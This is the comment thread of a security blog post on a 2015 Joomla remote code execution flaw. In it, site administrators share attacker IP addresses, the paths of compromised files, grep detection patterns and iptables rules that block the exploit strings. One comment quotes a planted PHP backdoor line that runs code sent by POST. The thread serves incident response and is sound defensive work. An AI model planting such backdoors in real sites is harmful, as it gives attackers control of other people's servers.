   4. ![](https://secure.gravatar.com/avatar/28d8746f8e51a51aa7d086610f4bec37?s=60&d=mm&r=g) **SamuelTSteiner** says: [December 14, 2015 at 10:48 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7068)

      Well they should. They are the only ones that even write about these exploits. When my site got hacked the only freaking site that was able to clear things up was this one.
   5. ![](https://secure.gravatar.com/avatar/28d8746f8e51a51aa7d086610f4bec37?s=60&d=mm&r=g) **SamuelTSteiner** says: [December 14, 2015 at 10:55 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7071)

      Well they should. They are the only ones that even write about these exploits. When my site got hacked the only freaking site that was able to clear things up was this one.
   6. ![](https://secure.gravatar.com/avatar/4cb8e6943b9665a66205f5203559b248?s=60&d=mm&r=g) **Martin Saunders** says: [December 15, 2015 at 10:00 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7092)

      stupid comment to make. Thanks Sucuri for a great service!
3. ![](https://secure.gravatar.com/avatar/0a3b75fa9541f747d239c0cd8eb7ff80?s=60&d=mm&r=g) **[bugggbear](http://gryzli.info)** says: [December 14, 2015 at 7:12 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7040)

   Until now I have seen the following IPs exploiting this exploit:
    74.3.170.33
    146.0.72.83
    173.245.53.153
    194.28.174.106
    195.191.149.139

   1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 8:54 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7044)

      Yep, same here.

      1. ![](https://secure.gravatar.com/avatar/0a3b75fa9541f747d239c0cd8eb7ff80?s=60&d=mm&r=g) **[bugggbear](http://gryzli.info)** says: [December 14, 2015 at 9:24 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7053)

         Also, one cloudflare ip showed up, it seems they don’t filter this..

         1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 9:26 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7054)

            Yep, their free plans don’t include protection. Not sure if they WAF (for pro and up) have a patch for this yet.

            1. ![](https://secure.gravatar.com/avatar/5a96c8a2bef4ef0f719c1f36ec7b90cf?s=60&d=mm&r=g) **Dan** says: [December 15, 2015 at 3:36 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7079)

               Can anyone confirm if this vulnerability is blocked or not by:
                – modesecurity
                – cloudflare
                – incapsula
            2. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 15, 2015 at 3:42 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7081)

               ModSecurity: Their default rules do not block it.

               CloudFlare: Not blocking it.

               Incapsula: Have not tested it.
            3. ![](https://secure.gravatar.com/avatar/5a96c8a2bef4ef0f719c1f36ec7b90cf?s=60&d=mm&r=g) **Dan** says: [December 15, 2015 at 3:53 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7082)

               Thanks Daniel.

               Is there any simple way we can test to see if vulnerable?
   2. ![](https://secure.gravatar.com/avatar/3e73b77c8b12f30908b132778238336e?s=60&d=mm&r=g) **Ngoc Pham** says: [December 15, 2015 at 4:40 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7083)

      Another one found on my server’s log: 207.244.70.35.
4. ![](https://secure.gravatar.com/avatar/ca3e81838f56b2a697de855256c46a93?s=60&d=mm&r=g) **John** says: [December 14, 2015 at 8:15 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7042)

   Can you tell us what was in the payload? I’ve had several sites hit with this and it is evaling a post variable($\_POST[111].)

   Knowing what was in this post variable would be quite helpful!

   1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 8:53 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7043)

      That’s a backdoor that gets injected. So whatever code the attacker provides will be executed.

      1. ![](https://secure.gravatar.com/avatar/b53f222408243b040d402ebb629940a8?s=60&d=mm&r=g) **[Rob Mangiafico](http://www.lexiconn.com/blog/)** says: [December 14, 2015 at 9:11 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7049)

         Looked to just be a GET URL though from our log analysis. I checked the database for changed info and could not find any, or any changed files, so I wonder if it was just a probe for now…?

         1. ![](https://secure.gravatar.com/avatar/e933774aa886b0afcd631dca9b24a325?s=60&d=mm&r=g) **Robert Mathews** says: [December 14, 2015 at 10:11 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7059)

            The GET stores that User-Agent string in the jos\_sessions database table for that IP address. Your logs should have a subsequent POST from the same IP address with the 111= payload; that’s where the exploit happens, when Joomla reloads the session data.

            1. ![](https://secure.gravatar.com/avatar/b53f222408243b040d402ebb629940a8?s=60&d=mm&r=g) **[Rob Mangiafico](http://www.lexiconn.com/blog/)** says: [December 14, 2015 at 10:22 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7062)

               Ah, ok, yes saw the POST afterwards. As John mentioned above, it would be nice to know what they did that Sucuri found, as I can’t seem to find the inserted back-door access in the DB or any files…
            2. ![](https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=60&d=mm&r=g) **Jacob Chafik** says: [December 15, 2015 at 10:11 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7110)

               After doing cleanup – I found a lot of the sites had modified

               /includes/defines.php
                /includes/framework.php

               It also modified a few PHP files at random to execute a POST payload using preg\_replace’s /e modifier.

               Simple way to search would be to search for any files modified in the last week or so
                find . -mtime 7
                find . -name “\*.php” -print0 | xargs -0 egrep “preg.\*\_replace.+/e.+\_POST”
            3. ![](https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=60&d=mm&r=g) **Dukes909** says: [December 16, 2015 at 3:07 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7119)

               My /includes/defines.php has this:
                if(strpos(implode($\_SERVER),”O:”))
                How do I find other files that are modified?
            4. ![](https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=60&d=mm&r=g) **Jacob Chafik** says: [December 16, 2015 at 3:37 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7122)

               That means your site was compromised. Part of the code modification actually closed the hole so others couldn’t exploit it. From a terminal, run the above `find` commands. The preg replace one will search for any attempts to execute code using POST data. The original `find . -mtime 7` will find any files modified in the last week.
            5. ![](https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=60&d=mm&r=g) **Dukes909** says: [December 16, 2015 at 3:59 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7131)

               Thanks, but I get 0 results doing both find commands you listed. The /includes/defines.php has a timestamp of September 8, 2015…?
            6. ![](https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=60&d=mm&r=g) **Jacob Chafik** says: [December 16, 2015 at 4:41 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7136)

               The exploit has been around for 8 years… so perhaps your site was attacked earlier? It’s also not difficult to manipulate the modification time. May also try atime (for access time). If you have weekly/monthly backups, compare with your last one.
            7. ![](https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=60&d=mm&r=g) **Dukes909** says: [December 16, 2015 at 5:20 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7143)

               I do have backups; whats the easiest way to compare file timestamps?
            8. ![](https://secure.gravatar.com/avatar/dd769e108e17c9c34a4497746f7f9a17?s=60&d=mm&r=g) **Jacob Chafik** says: [December 16, 2015 at 5:27 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7144)

               I would just compare files in general – look for any that have been changed. Don’t forget to check your DB for anything suspicious too.

               diff –brief -r dir1/ dir2/
            9. ![](https://secure.gravatar.com/avatar/a64395814fc1be8e5373b339a4c88df6?s=60&d=mm&r=g) **Concerned Joomla** says: [December 15, 2015 at 5:35 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7105)

               Does this mean we can search the jos\_sessions table to see if it was successful? What would we search on? The serialized data (ie, JDatabaseDriverMysql)?

               Would emptying out the jos\_sessions data basically prevent any “prepped” (ie, the post failed in deploying the payload but the session is still there waiting to be exploited again)?
      2. ![](https://secure.gravatar.com/avatar/ca3e81838f56b2a697de855256c46a93?s=60&d=mm&r=g) **John** says: [December 14, 2015 at 9:19 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7051)

         Yes, I know. Since it seems to be automated and you guys are blocking it, I was hoping you knew what their payload was/did, aside from just ‘it does bad things.’

         I think there is a decent chance it is consistent, but even if it isn’t knowing what the one you logged would be quite helpful.

         Every site I’ve checked so far has been hit so far and I have been doing all the normal server checks looking for malicious files, changing passwords, etc, but having an idea of what it was would make life way easier and probably save me some time 😉

         1. ![](https://secure.gravatar.com/avatar/4f2b3eb7753ca0af5effbeba7f4a8546?s=60&d=mm&r=g) **Robert Mathews** says: [December 14, 2015 at 10:31 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7063)

            I replied with a link to a copy of the malicious code being POSTed, but Sucuri didn’t approve my comment, which is fair enough, I guess.

            Anyway: It attempts to echo the contents of the configuration.php file back to the attacker, then patch the buggy files, then install a shell. However, it doesn’t seem to have succeeded in patching the files or installing the shell on any sites I’ve seen. Not clear why.

            1. ![](https://secure.gravatar.com/avatar/ca3e81838f56b2a697de855256c46a93?s=60&d=mm&r=g) **John** says: [December 14, 2015 at 10:51 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7069)

               Awesome, thanks!

               That does make me feel better, as changing the passwords was the first thing I did. I’ll take another pass on the files tomorrow, but I didn’t notice any obvious shells(or changes to the database/users) on the sites I checked.
            2. ![](https://secure.gravatar.com/avatar/2c6931f18151b64a4c63042698d852f9?s=60&d=mm&r=g) **Camden Narzt** says: [December 14, 2015 at 10:52 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7070)

               Could you send the link to cnarzt@scanimetrics.com?
            3. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 11:01 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7072)

               Nope, we didn’t block any comments. Mind re-sending? Maybe disqus blocked it for some reason.
            4. ![](https://secure.gravatar.com/avatar/4f2b3eb7753ca0af5effbeba7f4a8546?s=60&d=mm&r=g) **Robert Mathews** says: [December 14, 2015 at 11:17 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7073)

               Ah, the comment showed up eventually (below). It’s at pastebin dot com URLs /jbjqdcmx and /e25zxcn6 .

               I’ve since found a small number of sites where the shell DID get installed, and someone started using it to send spam. It looks like the payload they’re sending only works on some sites (perhaps 10-15% of the ones that were attacked?); not sure which or why. It’s also not yet clear to me if the “send the attacker the configuration.php file” part of the payload worked on only the ones where the shell install worked, or if that part worked on all of them.
            5. ![](https://secure.gravatar.com/avatar/7389fca87e62d824b044f4f397a19fb5?s=60&d=mm&r=g) **Matt Thomson** says: [December 15, 2015 at 1:49 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7077)

               Hi Robert,

               Could you please post the file paths to where shell did get installed on your sites and the filepaths of any files it tries to patch thanks.
            6. ![](https://secure.gravatar.com/avatar/835a729ab13565335d5c6b2f1e5c9b6a?s=60&d=mm&r=g) **Dom** says: [December 16, 2015 at 9:38 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7114)

               and mine seems to be more “elaborate” pastebin /rp23dRin
            7. ![](https://secure.gravatar.com/avatar/0223c98c957099e2cb2480790a62076d?s=60&d=mm&r=g) **Mex** says: [December 15, 2015 at 8:04 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7088)

               yes, you do: none of my comments with naxsi-rules (included | linked) showed up on your blog, not just this article, which is sad.
         2. ![](https://secure.gravatar.com/avatar/978d965162938ce8f9b3831410a38253?s=60&d=mm&r=g) **WooDzu** says: [December 15, 2015 at 11:14 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7094)

            After analysing the logs it looks like the attack was unsuccessful
             and the only thing that secured my website was a non-www to www
             redirection on Apache. Basically the $\_POST[111] payload was sent to non-www address and was redirected away. The bot didn’t bother to resent to www address.

            1. ![](https://secure.gravatar.com/avatar/700ec1373ae2f02f1a11d5cf7f2eac53?s=60&d=mm&r=g) **[Xristoph (X70) C.Rad](http://www.the12monkeys.com/)** says: [December 16, 2015 at 5:01 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7140)

               WooDzu, are you serious??? LOL that’s great…guess by default of my setup I’m protected too by the power of triple w
   2. ![](https://secure.gravatar.com/avatar/a30b13d6d37a32f13de83133e23afd55?s=60&d=mm&r=g) **[A Fisher](http://incolor.net/)** says: [December 15, 2015 at 5:38 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7085)

      For my sites that were accessed by the above IP addresses, I’ve found that the following file was modified on the same day. The contents are not only suspicious, they’re completely different from the stock Joomla file: libraries/joomla/session/session.php

      1. ![](https://secure.gravatar.com/avatar/700ec1373ae2f02f1a11d5cf7f2eac53?s=60&d=mm&r=g) **[Xristoph (X70) C.Rad](http://www.the12monkeys.com/)** says: [December 16, 2015 at 4:59 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7139)

         Thanks A Fisher, good to know which file we should keep an eye on. RSFirewall has a nifty new feature that allows for file comparison within the joomla admin control panel which has already proved useful.

         1. ![](https://secure.gravatar.com/avatar/a30b13d6d37a32f13de83133e23afd55?s=60&d=mm&r=g) **[A Fisher](http://incolor.net/)** says: [December 20, 2015 at 3:36 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7171)

            I found the changed file by using the file change scanner in Akeeba Admin Tools
5. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 8:57 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7046)

   Absolutely. The “one click update” applies to all affected versions? Or only for those on 3.4.x so far?
6. ![](https://secure.gravatar.com/avatar/3b2882cfd45e8aa3b2d08a693de409f6?s=60&d=mm&r=g) **TheOne** says: [December 14, 2015 at 9:46 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7056)

   What log do I need to look for? access\_log? I cannot find this

   grep JDatabaseDriverMysqli access\_log nothing found

   1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 10:10 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7057)

      Try to look on all your access log files. Depending on how your server is configured, they would be inside /var/log/http or /var/log/apache2 or ~/logs. You can even try a “grep -r” to go through all files and see if there is any hits there.

      thanks,
7. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 10:12 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7060)

   Awesome, thanks for the update. We will link to it in the post as well.
8. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 14, 2015 at 10:13 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7061)

   Thanks for confirming. Will link to your post as well.
9. ![](https://secure.gravatar.com/avatar/4b7f47ad3bda3f6f25b424ce25b53fbd?s=60&d=mm&r=g) **Brandon Weston** says: [December 14, 2015 at 10:35 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7064)

   I’ve been going through access logs and 4 of our websites were targeted by that described attack, with the same IP actually (146.0.72.83 ). Some of them returned code 200, which has me a little concerned. Do you have any information about where the payload is dropped?

   1. ![](https://secure.gravatar.com/avatar/45777e1472385c9312db4e55bb64ddaf?s=60&d=mm&r=g) **Greg** says: [January 16, 2016 at 5:35 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7236)

      We have found several new files and mod files across various sites, here are the most common
       /media/editors/tinymce/skins/lightgray/img/thumb.php
       /media/editors/tinymce/skins/lightgray/img/strange.php
       /libraries/index.php
       /includes/framework.php (modified header)
       /includes/defines.php (modified header)
       /media/system/js/thumb.php
       /cookietest.php
       /joomla\_verwx1.php
       /upload\_e45.php
       /update\_rxd.php
       /conf\_bmx.php
       /upload\_dni.php
       /update\_rxd.php
       /conf\_pue.php
       /upload\_3x0.php
       /joomla\_verw8f.php
       /config.php
       /wsdl.php
       /error.php
       /kurd.php
       /joomla\_ver5fm.php
       /upload\_v8v.php
       /upload\_gxo.php
       /upload\_51i.php
       /update\_g6z.php
       /joomla\_veria6.php
       /upload\_eln.php
       /upload\_guo.php
       /upload\_sj5.php
       /update\_rbu.php
10. ![](https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=60&d=mm&r=g) **Phil Taylor** says: [December 14, 2015 at 10:37 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7065)

    But no mention that this is – and was – a WP hack a few months ago, that this is just a clone of a well known technique already investigated by others, or that the result of this hack is a payload that effects 3 Joomla code files (/includes/framework.php, /includes/defines.php, /index.php) and uploads FilesMan backdoors to several places with several different known filenames – the payload – that YOUR customers are asking you for, that you dont seem to know… these files are dropped.

    sort.php
     conf.php
     utf8.php
     cp1251.php
     backup.php
     cache.php
     reverse.php
     bin.php
     cgi.php
     memcache.php
     sql.php

    all decoded from the seen FULL hack… all you are reporting is the basic stuff. You are also not noticing that the full hack involves PHP’s way of deserialising session objects, and the upstream PHP bug therein. And you are failing to report that SimplePie can be tweaked to override its validation of cache function names… so pretty much your blog post is very little based on actual facts about this particular hack.
11. ![](https://secure.gravatar.com/avatar/28d8746f8e51a51aa7d086610f4bec37?s=60&d=mm&r=g) **SamuelTSteiner** says: [December 14, 2015 at 10:47 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7067)

    Again? Really? Another zero day exploit??? Joomla wth?

    So did the Firewall block this exploit or is my site potentially hacked at this point?

    1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 16, 2015 at 3:58 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7129)

       This vulnerability can’t even be blamed to Joomla directly. The security of your site should not be dependent on flawless code alone. Almost everyone that applied security in depth were protected against this vulnerability. (or able to react fast)
12. ![](https://secure.gravatar.com/avatar/f591a6e3b3a029ba6f25795352823504?s=60&d=mm&r=g) **cryan** says: [December 15, 2015 at 12:48 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7075)

    Is there a simple patch for Joomla 3.0.2. I can’t seem to update my site without bricking it. Even a simple code change in sessions.php (as per Joomla 1.5 hotfix) that someone could provide? I have no modify permissions (Win IIS) outside of tmp and cache directories for IUSR account, will this protect me?
13. ![](https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=60&d=mm&r=g) **Anna Mendez** says: [December 15, 2015 at 1:00 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7076)

    How is possible to check of shell is installed? where should be if installed?
     also, wich files you mean when you say ‘patch the buggy files’?

    Sorry for my dummies question.
     Many thanks on advance

    1. ![](https://secure.gravatar.com/avatar/b53f222408243b040d402ebb629940a8?s=60&d=mm&r=g) **[Rob Mangiafico](http://www.lexiconn.com/blog/)** says: [December 15, 2015 at 2:11 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7078)

       Use this grep to find any shell files – we’ve found this in common on all of the hacked Joomlas and any uploaded files:
        grep -rl ‘default\_action = ‘ ./ –include=\*.php
14. ![](https://secure.gravatar.com/avatar/5a96c8a2bef4ef0f719c1f36ec7b90cf?s=60&d=mm&r=g) **Dan** says: [December 15, 2015 at 3:38 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7080)

    Does anyone know if this vulnerability is blocked or not by:
     – modesecurity
     – cloudflare
     – incapsula
15. ![](https://secure.gravatar.com/avatar/b840347c9b647b15a27b29c5c72b6297?s=60&d=mm&r=g) **László Kovács** says: [December 15, 2015 at 7:29 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7086)

    iptables -A INPUT -s 146.0.72.83 -j DROP
     iptables -A INPUT -s 74.3.170.33 -j DROP
     iptables -A INPUT -s 194.28.174.106 -j DROP
     iptables -A INPUT -s 35.0.127.52 -j DROP
     iptables -A INPUT -p tcp –dport 80 -m string –algo bm –string “JDatabaseDriverMysqli” -j DROP
     iptables -A INPUT -p tcp –dport 80 -m string –algo bm –string “O:” -j DROP

    1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 15, 2015 at 2:34 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7099)

       Great rules. Might be a bit too aggressive, since it will block things outside of the user agent as well.

       1. ![](https://secure.gravatar.com/avatar/b840347c9b647b15a27b29c5c72b6297?s=60&d=mm&r=g) **László Kovács** says: [December 16, 2015 at 7:15 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7113)

          A bit. 🙂 We removed this:

          iptables -A INPUT -p tcp –dport 80 -m string –algo bm –string “O:” -j DROP
16. ![](https://secure.gravatar.com/avatar/c77eb506b7bf0e494439dbf459e41d87?s=60&d=mm&r=g) **Els** says: [December 15, 2015 at 7:35 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7087)

    Silly question: if the site was attacked, what is the “remediation / incident response phase” you mention above? I’ve already applied the hotfix (Joomla 1.5), but it sounds like that would only work pre-attack, not post-attack?

    1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 16, 2015 at 3:49 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7124)

       Yes, that only works pre-attack. Post-compromise, you have to to do a full cleanup and remove whatever backdoor/malware they added.

       An easy way is to diff (compare) your current version with your last backup. Find all modified files and see if they have been injected. Or even revert back to your last known/good backup.

       A second option is to try to search for the last files modified and see if they are hacked, but not 100% effective.

       We also offer remediation (cleanup) as part of our plans if you do not want to do it yourself:

       <https://sucuri.net/website-antivirus/>

       thanks!

       1. ![](https://secure.gravatar.com/avatar/9946c075ed5976a4373a2ecf6c76d67d?s=60&d=mm&r=g) **kolydart** says: [December 16, 2015 at 8:04 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7147)

          Thank you. Do you know if the exploit allowed interaction with the DataBase? In that case, I guess we should also search in the data, which makes cleaning much harder..
           I noticed in the log, terms like JFactory::getConfig() indicating the intruders had access to site credentials.
           Also, I found a file planted by the intruders in the following path: /libraries/joomla/exporter.php
           The file contained the following: if (md5($\_POST[‘password’]) == ‘cacf9427ffc71edf7565bd43383c71c7’) { preg\_replace(“43565243145″, ”
           14516614115450142141163145666413714414514315714414550′” . $\_POST[‘code’] . “‘515173″, ”); }

          1. ![](https://secure.gravatar.com/avatar/c77eb506b7bf0e494439dbf459e41d87?s=60&d=mm&r=g) **Els** says: [December 17, 2015 at 2:47 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7156)

             I have the opposite problem. Had a database backup from barely a week ago, so reuploaded that one. (no changes in the last week). But now to go through all the files to see if they were changed in the last week (or find the “latest” file backup two harddisks ago…)
       2. ![](https://secure.gravatar.com/avatar/c77eb506b7bf0e494439dbf459e41d87?s=60&d=mm&r=g) **Els** says: [December 17, 2015 at 2:50 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7157)

          Thanks, I’ll go the diff route, once I’ve dug up my last full backup.
17. ![](https://secure.gravatar.com/avatar/978d965162938ce8f9b3831410a38253?s=60&d=mm&r=g) **WooDzu** says: [December 15, 2015 at 9:16 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7089)

    Serializing PHP is evil, should do dump to json and load from json instead. There will always be holes like that, one way or another.

    Thanks for the detection instructions! All clear here.
18. ![](https://secure.gravatar.com/avatar/eb8da0cd2557d5535a041b52b1c4486e?s=60&d=mm&r=g) **Ea1Y** says: [December 15, 2015 at 9:45 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7090)

    does someone has logs or an ossec rules ? thanks

    1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 16, 2015 at 3:57 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7127)

       OSSEC rules here:

       <https://bitbucket.org/dcid/ossec-hids/commits/67696e5691127a47adba1be83826e3f73bdcea75>

       1. ![](https://secure.gravatar.com/avatar/eb8da0cd2557d5535a041b52b1c4486e?s=60&d=mm&r=g) **Ea1Y** says: [December 16, 2015 at 3:59 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7130)

          thanks
19. ![](https://secure.gravatar.com/avatar/de9169c6c2cc9a4924a347c84a7d2d5b?s=60&d=mm&r=g) **Joomlabugs** says: [December 15, 2015 at 9:48 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7091)

    Morning!

    For update the Joomla only can extract the tarball of Joomla\_3.4.5\_to\_3.4.6 in the root directory of www?

    Thanks.
20. ![](https://secure.gravatar.com/avatar/6bbc2496baa74a39f5b2fefdb1afceb2?s=60&d=mm&r=g) **Jovan Style** says: [December 15, 2015 at 11:17 am](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7095)

    if joomla is installed in windows, what would be the impact?

    1. ![](https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=60&d=mm&r=g) **[Daniel Cid](http://dcid.me)** says: [December 15, 2015 at 2:33 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7098)

       That’s the same. They will be able to execute commands via PHP.
21. ![](https://secure.gravatar.com/avatar/f1913e6bf85372dc9a308b68679d49d6?s=60&d=mm&r=g) **[Alexandros A.](http://subs.gr)** says: [December 15, 2015 at 2:42 pm](https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7100)

    I did a log analysis in more that 200 servers so here are some more IPs :

    5.135.158.101
     5.196.1.129
     5.196.72.199
     5.196.72.207
     5.79.68.161
     5.9.36.66
     31.220.45.6
     35.0.127.52
     37.130.227.133
     37.187.129.166
     37.48.80.101
     37.48.80.73
     37.48.81.27
     46.165.230.5
     46.183.221.231
     46.45.137.71
     51.255.38.230
     51.255.38.231
     62.102.148.67
     62.210.105.116
     62.210.37.82
     64.27.17.140
     71.19.248.195
     71.19.248.201
     71.19.248.46
     77.244.254.230
     77.247.178.245
     77.247.181.163
     77.247.181.165
     77.51.138.131
     79.172.193.32
     80.82.64.129
     81.7.16.13
     82.174.117.44
     83.233.119.138
     85.10.210.199
     85.214.98.239
     85.245.242.72
     85.25.103.119
     85.25.44.141
     85.93.218.204
     88.198.14.171
     89.144.10.210
     89.187.142.208
     89.234.157.254
     89.248.160.156
     89.248.167.141
     89.73.177.236
     91.203.5.165
     91.213.8.236
     91.233.117.159
     91.234.22.48
     91.240.67.138
     91.250.241.241
     93.115.95.201
     93.115.95.205
     93.115.95.206
     93.115.95.207
     93.174.90.30
     93.184.66.227
     94.142.242.84
     94.242.228.108
     94.242.246.24
     94.242.253.92
     94.30.181.134
     95.130.13.157
     95.69.233.211
     104.156.228.165
     104.200.78.157
     104.238.169.40
     109.163.234.2
     109.163.234.4
     109.163.234.5
     109.163.234.7
     109.163.234.9
     109.194.217.99
     109.201.133.100
